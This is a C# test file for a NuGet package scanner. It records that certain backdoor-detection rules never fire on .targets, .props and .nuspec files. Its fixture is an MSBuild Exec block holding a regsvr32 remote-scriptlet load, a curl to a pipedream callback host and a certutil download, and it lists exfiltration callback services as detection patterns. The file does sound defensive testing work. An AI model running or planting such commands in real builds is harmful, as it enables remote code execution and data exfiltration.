namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;

using Silvergun;

using Xunit;

/// <summary>
/// KNOWN GAP, pinned deliberately: <b>the AppInspector script seam is gated to ecosystems a <c>.nupkg</c> does not
/// contain</b>, so its two richest IOC rules are unreachable on NuGet content.
/// <para>
/// <see cref="ScriptRuleScanner"/> drives AppInspector's low-level <c>RuleProcessor.AnalyzeFile</c>, passing the
/// language returned by <c>Languages.FromFileNameOut</c> and falling back to a default <c>LanguageInfo</c> (whose
/// <c>Name</c> is the empty string) when detection fails. AppInspector selects a rule for a file when the rule is
/// <em>ungated</em> (no <c>applies_to</c>, no <c>applies_to_file_regex</c>) or when its <c>applies_to</c> contains the
/// detected language name. An empty language name matches no <c>applies_to</c> entry, so on the default-language path
/// <b>only ungated rules ever run</b>.
/// </para>
/// <para>
/// Measured, not inferred (this file is the measurement <c>docs/agent/research/ttp-seam-mapping.md</c> §6 asks for;
/// that document explicitly marks the claim "Not measured, inferred"). One fixture body carrying all three of a
/// BD001002 callback host, a BD000900 command token and an ungated BD000600 LOLBAS token, written under ten
/// extensions and run through the real scanner:
/// </para>
/// <code>
/// file            detected language        BD001002  BD000900  BD000600/610 (ungated control)
/// probe.targets   &lt;none&gt; -&gt; default        no        no        YES
/// probe.props     &lt;none&gt; -&gt; default        no        no        YES
/// probe.nuspec    &lt;none&gt; -&gt; default        no        no        YES
/// probe.ps1       powershell               no        YES       YES
/// probe.psm1      powershell               no        YES       YES
/// probe.js        javascript               YES       no        YES
/// package.json    package.json             YES       no        YES
/// probe.py        python                   no        no        YES
/// probe.xml       XML                      no        no        YES
/// </code>
/// <para>
/// The ungated column is the control that matters: the gated files <b>are</b> read, analyzed and matched — they are
/// not skipped — so the absence of BD001002/BD000900 on them is language gating and nothing else.
/// </para>
/// <para>
/// The consequence for the product: a package whose <c>.nuspec</c> <c>&lt;repository url&gt;</c> or whose
/// <c>.targets</c> <c>&lt;Exec&gt;</c> points at <c>pipedream.net</c>/<c>ceye.io</c>/<c>burpcollaborator.net</c>/
/// <c>interact.sh</c>/<c>requestbin.net</c> — an out-of-band exfiltration callback, i.e. exactly ReversingLabs policy
/// TH17126 — produces <b>no script finding at all</b>. Silvergun's inventory admits only <c>.ps1</c>, <c>.psm1</c>,
/// <c>.targets</c>, <c>.props</c> and the top-level <c>.nuspec</c> (<c>NuGetPackage.cs</c>), so no file it scans can
/// ever carry the <c>javascript</c>, <c>package.json</c> or <c>python</c> language BD001002 and eleven sibling rules
/// require.
/// </para>
/// <para>
/// <b>These assertions are NOT desired behaviour.</b> They record a live defect so it is not rediscovered as a
/// surprise, and so the fix has a signal. Provenance for the embedded MIT rulesets lives in
/// <c>Resources/BackdoorRules/NOTICE.md</c>.
/// </para>
/// <para>
/// <b>Update 2026-08-03:</b> the fix landed as <c>docs/agent/tasks/silvergun-script-ruleset.md</c> — a NEW,
/// Silvergun-owned, ungated ruleset under <c>Resources/SilvergunRules/</c> (<c>SG0001</c>/<c>SG0002</c> callback and
/// exfil-sink domains, <c>SG0010</c>/<c>SG0011</c> MSBuild <c>&lt;Exec&gt;</c>), not a re-scope of the embedded
/// OSSGadget <c>BD*</c> rules (which stay untouched — editing them would break provenance, see the ruleset spec's
/// hard constraints). <b>The BD001002/BD000900-specific gap pinned by every test in this class remains real and
/// intentionally unfixed</b> — those OSSGadget rules genuinely still cannot fire on a <c>.nupkg</c>, and this class
/// still is the measurement for that. Only <see cref="KnownGap_NuspecWithCallbackUrls_YieldsNoFinding_ThroughScanPackageMetadata"/>,
/// which asserted the end-to-end *consequence* ("no script finding at all" via the ONLY seam that existed then), went
/// red now that <c>SG0001</c> reaches the same file through the new ruleset, and was rewritten below (not loosened)
/// to assert that finding. See <c>SilvergunRulesetTests</c> for the new ruleset's full coverage.
/// </para>
/// </summary>
public sealed class ScriptRuleLanguageGatingTests : IDisposable
{
    #region Constructors
    // The scanner logs through the shared Runtime (a NullLogger until initialized); initialize like the other
    // fixture-less test classes so the log calls exercise the real pipeline. Fixture files are generated per class
    // instance into a temp directory and deleted on dispose: no callback domain is ever committed as package content.
    public ScriptRuleLanguageGatingTests()
    {
        Runtime.Initialize("Silvergun", "TESTS");
        this.directory = Path.Combine(Path.GetTempPath(), "silvergun-rule-gating-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(this.directory);
    }
    #endregion

    #region Methods — rule metadata (the gate declarations themselves)
    // BD001002 — the callback/interactsh host rule that is policy TH17126 — is declared for javascript and
    // package.json. A .nupkg contains neither, which is the whole defect. Re-scoping it (adding a language a NuGet
    // file resolves to, or removing applies_to entirely) fails this test: that is the intended signal.
    // CONTROL COLUMN — keep, do not delete: this is the measurement that justifies the whole Silvergun-owned
    // SG0001/SG0002/SG0010/SG0011 ruleset (docs/agent/tasks/silvergun-script-ruleset.md). BD001002 still does NOT
    // fire on a .nuspec; SilvergunRulesetTests covers the same domain via the new, ungated SG0001 instead.
    [Fact]
    public void KnownGap_BD001002_DeclaresAppliesTo_JavaScriptAndPackageJson_Only()
    {
        var rule = Rule("BD001002");

        Assert.Equal(new[] { "javascript", "package.json" }, AppliesTo(rule));
        Assert.Empty(AppliesToFileRegex(rule));

        // Pin what the gate is keeping out of reach, so a pattern edit does not silently change what this documents.
        var pattern = rule.GetProperty("patterns")[0].GetProperty("pattern").GetString();
        Assert.NotNull(pattern);
        foreach (var host in new[] { "pipedream", "ceye", "burpcollaborator", "interact", "requestbin" })
            Assert.Contains(host, pattern!, StringComparison.Ordinal);
    }

    // BD000900 — the richest command-IOC rule in the set — is PowerShell-only.
    [Fact]
    public void KnownGap_BD000900_DeclaresAppliesTo_PowerShellOnly()
    {
        var rule = Rule("BD000900");

        Assert.Equal(new[] { "powershell" }, AppliesTo(rule));
        Assert.Empty(AppliesToFileRegex(rule));
    }

    // The gate declarations across the whole embedded set name four ecosystems, none of which is MSBuild, XML or
    // nuspec: there is no rule written for the build/manifest content a .nupkg actually ships. Adding one fails this.
    [Fact]
    public void KnownGap_NoEmbeddedRule_TargetsMsBuildXmlOrNuspec()
    {
        var languages = Rules()
            .SelectMany(AppliesTo)
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .OrderBy(l => l, StringComparer.Ordinal)
            .ToArray();

        Assert.Equal(new[] { "javascript", "package.json", "powershell", "python" }, languages);

        // The only file-name gate in the set is a Python one; nothing keys on .targets/.props/.nuspec.
        var fileRegexes = Rules().SelectMany(AppliesToFileRegex).Distinct(StringComparer.Ordinal).ToArray();
        Assert.Equal(new[] { "setup.py" }, fileRegexes);
    }

    // Scale of the gap, measured from the embedded resources rather than quoted: of 44 rules, 30 are ungated (so they
    // do run on .targets/.props/.nuspec) and 14 are gated — but only the 2 PowerShell rules are reachable from a
    // .nupkg, leaving 12 rules that can never fire on any file Silvergun scans in a package.
    [Fact]
    public void KnownGap_TwelveOfFortyFourRules_CanNeverFireOnAnyNupkgFile()
    {
        var rules = Rules();
        var gated = rules.Where(r => AppliesTo(r).Length > 0 || AppliesToFileRegex(r).Length > 0).ToArray();

        // Reachable languages for the inventoried file set: .ps1/.psm1 -> powershell; .targets/.props/.nuspec ->
        // default LanguageInfo (empty name, ungated rules only). See NuGetPackage.IsScript.
        var unreachable = gated
            .Where(r => !AppliesTo(r).Contains("powershell", StringComparer.OrdinalIgnoreCase))
            .Select(Id)
            .OrderBy(id => id, StringComparer.Ordinal)
            .ToArray();

        Assert.Equal(44, rules.Length);
        Assert.Equal(14, gated.Length);
        Assert.Equal(
            new[]
            {
                "BD000102", "BD000103", "BD000301", "BD000711", "BD000712", "BD000806",
                "BD000807", "BD000808", "BD000809", "BD001001", "BD001002", "BD001003",
            },
            unreachable);
    }
    #endregion

    #region Methods — measured behaviour through the real scanner
    // THE GAP. Every file type a .nupkg can carry to the script seam: the callback host is present in the content and
    // produces no BD001002 finding on any of them, including the two PowerShell types where the seam does work for
    // other rules. TH17126 is therefore unreachable for NuGet, exactly as the seam mapping suspected.
    [Theory]
    [InlineData("build.targets")]
    [InlineData("build.props")]
    [InlineData("package.nuspec")]
    [InlineData("install.ps1")]
    [InlineData("module.psm1")]
    public void KnownGap_CallbackDomain_ProducesNoBD001002Finding_OnEveryFileTypeANupkgContains(string fileName)
    {
        var ids = ScanFixture(fileName);

        Assert.DoesNotContain("BD001002", ids);
    }

    // The command-IOC rule is likewise silent on the three build/manifest types, which is where NuGet install-time
    // execution actually lives (.targets/.props run inside MSBuild on restore/build).
    [Theory]
    [InlineData("build.targets")]
    [InlineData("build.props")]
    [InlineData("package.nuspec")]
    public void KnownGap_CommandIoc_ProducesNoBD000900Finding_OnBuildAndManifestFiles(string fileName)
    {
        var ids = ScanFixture(fileName);

        Assert.DoesNotContain("BD000900", ids);
    }

    // POSITIVE CONTROL for BD000900. The identical content under .ps1/.psm1 resolves to the powershell language and
    // does fire, so the rule works and the misses above are gating — not a broken rule or a broken engine.
    [Theory]
    [InlineData("install.ps1")]
    [InlineData("module.psm1")]
    public void CommandIoc_ProducesBD000900Finding_OnPowerShellScripts(string fileName)
    {
        var ids = ScanFixture(fileName);

        Assert.Contains("BD000900", ids);
    }

    // POSITIVE CONTROL for BD001002: the rule fires on the ecosystems it is declared for. Neither extension is ever
    // inventoried from a .nupkg (NuGetPackage.IsScript), so this control can only be run on a synthetic file — which
    // is precisely the point.
    [Theory]
    [InlineData("index.js")]
    [InlineData("package.json")]
    public void CallbackDomain_ProducesBD001002Finding_OnJavaScriptAndPackageJson(string fileName)
    {
        var ids = ScanFixture(fileName);

        Assert.Contains("BD001002", ids);
    }

    // THE CONTROL THAT MAKES THE GAP A GAP. The build/manifest files are genuinely read, analyzed and matched: the
    // ungated LOLBAS rules in the same fixture body fire on all three. Nothing is being skipped, size-capped or
    // erroring out — the two gated rules are simply never selected for these files.
    [Theory]
    [InlineData("build.targets")]
    [InlineData("build.props")]
    [InlineData("package.nuspec")]
    public void UngatedRules_StillFire_OnBuildAndManifestFiles_ProvingTheyAreAnalyzed(string fileName)
    {
        var ids = ScanFixture(fileName);

        Assert.Contains("BD000600", ids);       // LOLBAS: Windows Indicator — no applies_to, so it is selected
        Assert.NotEmpty(ids);
    }

    // End-to-end at the seam the product actually uses for a manifest: ScanPackageMetadata over a realistic nuspec
    // whose <projectUrl> and <repository url> are callback hosts. Prose redaction is not relevant here — both
    // elements are non-prose and survive redaction verbatim (asserted below).
    //
    // REWRITTEN 2026-08-03 (was KnownGap_NuspecWithCallbackUrls_YieldsNoFinding_ThroughScanPackageMetadata, per the
    // class doc's own directive: rewrite to assert the new behaviour, do not loosen). The BD001002 gap this class
    // measures is unchanged — BD001002 itself still never fires here (see KnownGap_CallbackDomain_ProducesNoBD001002-
    // Finding_OnEveryFileTypeANupkgContains). What changed is the end-to-end consequence: the new, ungated SG0001
    // (docs/agent/tasks/silvergun-script-ruleset.md) now reaches this same file through the separate SilvergunRules
    // ruleset, so the scan is no longer silent. Both callback URLs match, aggregating to one SG0001 finding with
    // Occurrences == 2 (ScriptRuleScanner.Aggregate collapses matches per rule/file). Full SG0001/SG0002/SG0010/SG0011
    // coverage lives in SilvergunRulesetTests; this test's job is only to keep this specific end-to-end seam honest.
    [Fact]
    public void NuspecWithCallbackUrls_YieldsSG0001Finding_ThroughScanPackageMetadata()
    {
        var nuspec = string.Join("\n",
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
            "<package><metadata>",
            "  <id>Contoso.Utilities</id>",
            "  <version>1.0.0</version>",
            "  <description>Utility helpers for Contoso applications.</description>",
            $"  <projectUrl>https://{CallbackHost}/p</projectUrl>",
            $"  <repository type=\"git\" url=\"https://{CallbackHost}/r\" />",
            "</metadata></package>");

        var path = Write("Contoso.Utilities.nuspec", nuspec);

        // The URLs survive redaction (non-prose elements are untouched) — the SG0001 finding below comes from real
        // content reaching the rule, not an artifact of an unredacted body.
        var redacted = ScriptRuleScanner.RedactProse(nuspec);
        Assert.Contains(CallbackHost, redacted, StringComparison.Ordinal);

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, "Contoso.Utilities.nuspec");

        var sg0001 = Assert.Single(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(2, sg0001.Occurrences);                       // projectUrl AND repository url both matched
        Assert.Equal(ScriptFindingSource.PackageMetadata, sg0001.Source);
    }
    #endregion

    #region Methods — helpers
    public void Dispose()
    {
        try
        {
            if (Directory.Exists(this.directory))
                Directory.Delete(this.directory, recursive: true);
        }
        catch (IOException)
        {
            // A leaked temp directory must never fail a test run.
        }
    }

    // Writes the shared fixture body under `fileName` and returns the rule ids the real scanner reports for it. The
    // body is byte-identical across every extension, so the only variable in the matrix is the detected language.
    private string[] ScanFixture(string fileName) => new ScriptRuleScanner()
        .ScanFile(Write(fileName, FixtureContent), fileName)
        .Select(f => f.RuleId)
        .ToArray();

    private string Write(string fileName, string content)
    {
        var path = Path.Combine(this.directory, fileName);
        File.WriteAllText(path, content);
        return path;
    }

    private static JsonElement Rule(string id) =>
        Rules().Single(r => Id(r).Equals(id, StringComparison.OrdinalIgnoreCase));

    private static string Id(JsonElement rule) => rule.GetProperty("id").GetString() ?? string.Empty;

    private static string[] AppliesTo(JsonElement rule) => StringArray(rule, "applies_to");

    private static string[] AppliesToFileRegex(JsonElement rule) => StringArray(rule, "applies_to_file_regex");

    private static string[] StringArray(JsonElement rule, string property) =>
        rule.TryGetProperty(property, out var value)
            ? value.EnumerateArray().Select(e => e.GetString() ?? string.Empty).ToArray()
            : Array.Empty<string>();

    // Reads the rulesets from the shipped assembly's manifest resources — the same resources BuildProcessor loads —
    // so the metadata assertions describe what is actually embedded, not what is on disk under a csproj glob.
    private static JsonElement[] Rules() => rules.Value;

    private static JsonElement[] LoadRules()
    {
        var assembly = typeof(ScriptRuleScanner).Assembly;
        var names = assembly.GetManifestResourceNames()
            .Where(n => n.Contains(".Resources.BackdoorRules.", StringComparison.Ordinal)
                     && n.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
            .OrderBy(n => n, StringComparer.Ordinal);

        var loaded = new List<JsonElement>();
        foreach (var name in names)
        {
            using var stream = assembly.GetManifestResourceStream(name)!;
            using var reader = new StreamReader(stream);
            loaded.AddRange(JsonDocument.Parse(reader.ReadToEnd()).RootElement.EnumerateArray());
        }

        Assert.NotEmpty(loaded);
        return loaded.ToArray();
    }
    #endregion

    #region Fields
    // A fixture host under a domain BD001002 matches. Generated into a temp file at run time and deleted on dispose —
    // never committed as package content — and the label makes it unmistakably a fixture rather than live infra.
    private const string CallbackHost = "silvergun-fixture-not-live.pipedream.net";

    // One body carrying all three signals, so a single fixture drives the whole matrix:
    //   * a BD001002 callback host           (gated: javascript, package.json)
    //   * "regsvr32", a BD000900 token       (gated: powershell)
    //   * whitespace-delimited LOLBAS tokens (ungated BD000600/BD000610 — the "this file was analyzed" control)
    // It is shaped as MSBuild because that is the carrier the gap is about; the rules are regexes over raw text, so
    // the shape is irrelevant to matching and only the file's extension varies across the theories.
    private static readonly string FixtureContent = string.Join("\n",
        "<Project>",
        "  <Target Name=\"Install\" AfterTargets=\"Build\">",
        "    <Exec Command=\"x regsvr32 /s /u /i:http://x.example/a scrobj.dll\" />",
        $"    <Exec Command=\"x curl https://{CallbackHost}/collect\" />",
        "    <Exec Command=\"x certutil -urlcache -f http://x.example/n.exe n.exe\" />",
        "  </Target>",
        "</Project>");

    private static readonly Lazy<JsonElement[]> rules = new(LoadRules);

    private readonly string directory;
    #endregion
}
